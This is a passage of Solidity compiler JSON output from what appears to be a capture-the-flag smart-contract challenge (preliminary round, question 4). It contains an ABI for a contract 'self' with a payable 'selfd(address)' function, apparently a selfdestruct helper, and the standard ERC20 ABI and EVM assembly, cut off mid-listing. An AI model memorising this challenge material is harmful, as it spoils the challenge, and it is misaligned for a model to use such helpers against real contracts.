					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"selfd\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":\"self\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":{\"keccak256\":\"0x6c5b72099bc5f9740cbeb28650f50b1291a1eca5fbdbf6611673c9c8bcf2ba41\",\"urls\":[\"bzz-raw://f123693ee63491f5f4e4f8a62829af806c8814e5bdaaf6ce34ce08dbf396c33d\",\"dweb:/ipfs/QmPoszddSPRrmMRMFwfT9cXvCZmLbSEobQwqV2p1qEvd99\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20.sol\":{\"keccak256\":\"0x91a3b598fc86ea761b5a8296e26690e460e78d1606eb518994e5c2ba15fa194f\",\"urls\":[\"bzz-raw://f2e312a214c618db25822c5af3c0ea4811c7f42422b0d1051d468adbfbb53774\",\"dweb:/ipfs/QmdG5we7FRV1TFopjEvhSb63e5K2HUE3Y5fcdcR3CcuDe4\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20Detailed.sol\":{\"keccak256\":\"0xe20fce8726ac6988a627b4abae707647c8c46d9b5be24e0e085c718e854d9e34\",\"urls\":[\"bzz-raw://99a90f29bbd180bc88edf71c0583ec07d109bcfae5530aaffee434d0188c33e8\",\"dweb:/ipfs/Qmb2AKkdtcH2eWtXtaaSqABrLtBgcc9ppkn4iJPP89NNKp\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":{\"keccak256\":\"0xd45135fede71fe4b2f06ccc22c459f880912785065a13f5ebf85ebe3d07d632e\",\"urls\":[\"bzz-raw://e38e11ed61a168499a2128f65c4248f9cb76a12fb0c9f2ae0e0e0ade46c5ba9f\",\"dweb:/ipfs/QmdAEvzLRsCtT6Yp1ruyymfaQ4hDtQMmBFjYY9MB4YQSBm\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/SafeMath.sol\":{\"keccak256\":\"0x11a066623aa9848c105e3610dd03f30d87881271d8da83a3974f898d5314025c\",\"urls\":[\"bzz-raw://76812a0f7047a8d98e291415723003b6238024ef37572453dcd96c70c946f9a7\",\"dweb:/ipfs/Qmf8SQN4J9ghTq3mVjxenmVAZtR8RnqvdfDvR5jma1gpJk\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"赛题-预赛/第四题/contracts/ERC20.sol": {
				"ERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "subtractedValue",
									"type": "uint256"
								}
							],
							"name": "decreaseAllowance",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "addedValue",
									"type": "uint256"
								}
							],
							"name": "increaseAllowance",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Implementation of the {IERC20} interface.  * This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. For a generic mechanism see {ERC20Mintable}.  * TIP: For a detailed writeup see our guide https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms].  * We have followed general OpenZeppelin guidelines: functions revert instead of returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC20 applications.  * Additionally, an {Approval} event is emitted on calls to {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening to said events. Other implementations of the EIP may not emit these events, as it isn't required by the specification.  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance} functions have been added to mitigate the well-known issues around setting allowances. See {IERC20-approve}.",
						"methods": {
							"allowance(address,address)": {
								"details": "See {IERC20-allowance}."
							},
							"approve(address,uint256)": {
								"details": "See {IERC20-approve}.      * Requirements:      * - `spender` cannot be the zero address."
							},
							"balanceOf(address)": {
								"details": "See {IERC20-balanceOf}."
							},
							"decreaseAllowance(address,uint256)": {
								"details": "Atomically decreases the allowance granted to `spender` by the caller.      * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.      * Emits an {Approval} event indicating the updated allowance.      * Requirements:      * - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
							},
							"increaseAllowance(address,uint256)": {
								"details": "Atomically increases the allowance granted to `spender` by the caller.      * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.      * Emits an {Approval} event indicating the updated allowance.      * Requirements:      * - `spender` cannot be the zero address."
							},
							"totalSupply()": {
								"details": "See {IERC20-totalSupply}."
							},
							"transfer(address,uint256)": {
								"details": "See {IERC20-transfer}.      * Requirements:      * - `recipient` cannot be the zero address. - the caller must have a balance of at least `amount`."
							},
							"transferFrom(address,address,uint256)": {
								"details": "See {IERC20-transferFrom}.      * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20};      * Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `value`. - the caller must have allowance for `sender`'s tokens of at least `amount`."
							}
						}
					},
					"evm": {
						"assembly": "    /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1256:7787  contract ERC20 is IERC20 {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1256:7787  contract ERC20 is IERC20 {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1256:7787  contract ERC20 is IERC20 {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1256:7787  contract ERC20 is IERC20 {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x70a08231\n      gt\n      tag_11\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xa457c2d7\n      eq\n      tag_8\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_9\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_10\n      jumpi\n      jump(tag_2)\n    tag_11:\n      dup1\n      0x095ea7b3\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x39509351\n      eq\n      tag_6\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n    tag_3:\n      tag_12\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_13:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_14\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1559:1650  function totalSupply() public view returns (uint256) {\r... */\n    tag_4:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n    tag_5:\n      tag_17\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_18:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_19\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n    tag_6:\n      tag_20\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_21:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_22\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n    tag_7:\n      tag_23\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_24:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_25\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n    tag_8:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_27:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_28\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n    tag_9:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_30\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_30:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_31\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n    tag_10:\n      tag_32\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_33\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_33:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_34\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n    tag_14:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2601:2605  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2618:2654  _approve(msg.sender, spender, value) */\n      tag_36\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2627:2637  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2639:2646  spender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2648:2653  value */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2618:2626  _approve */\n      tag_37\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2618:2654  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_36:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2672:2676  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2665:2676  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1559:1650  function totalSupply() public view returns (uint256) {\r... */\n    tag_16:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1603:1610  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1630:1642  _totalSupply */\n      sload(0x02)\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1623:1642  return _totalSupply */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1559:1650  function totalSupply() public view returns (uint256) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n    tag_19:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3244:3248  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3261:3297  _transfer(sender, recipient, amount) */\n      tag_40\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3271:3277  sender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3279:3288  recipient */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3290:3296  amount */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3261:3270  _transfer */\n      tag_41\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3261:3297  _transfer(sender, recipient, amount) */\n      jump\t// in\n    tag_40:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3308:3381  _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount)) */\n      tag_42\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3317:3323  sender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3325:3335  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3380  _allowances[sender][msg.sender].sub(amount) */\n      tag_43\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3373:3379  amount */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3348  _allowances */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3356  _allowances[sender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3349:3355  sender */\n      dup11\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3356  _allowances[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3368  _allowances[sender][msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3357:3367  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3368  _allowances[sender][msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3372  _allowances[sender][msg.sender].sub */\n      tag_44\n      swap1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3380  _allowances[sender][msg.sender].sub(amount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_43:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3308:3316  _approve */\n      tag_37\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3308:3381  _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount)) */\n      jump\t// in\n    tag_42:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3399:3403  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3392:3403  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n    tag_22:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3900:3904  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3917:3996  _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue)) */\n      tag_46\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3926:3936  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3938:3945  spender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3995  _allowances[msg.sender][spender].add(addedValue) */\n      tag_47\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3984:3994  addedValue */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3958  _allowances */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3970  _allowances[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3959:3969  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3970  _allowances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3979  _allowances[msg.sender][spender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3971:3978  spender */\n      dup10\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3979  _allowances[msg.sender][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3983  _allowances[msg.sender][spender].add */\n      tag_48\n      swap1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3995  _allowances[msg.sender][spender].add(addedValue) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_47:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3917:3925  _approve */\n      tag_37\n        /* 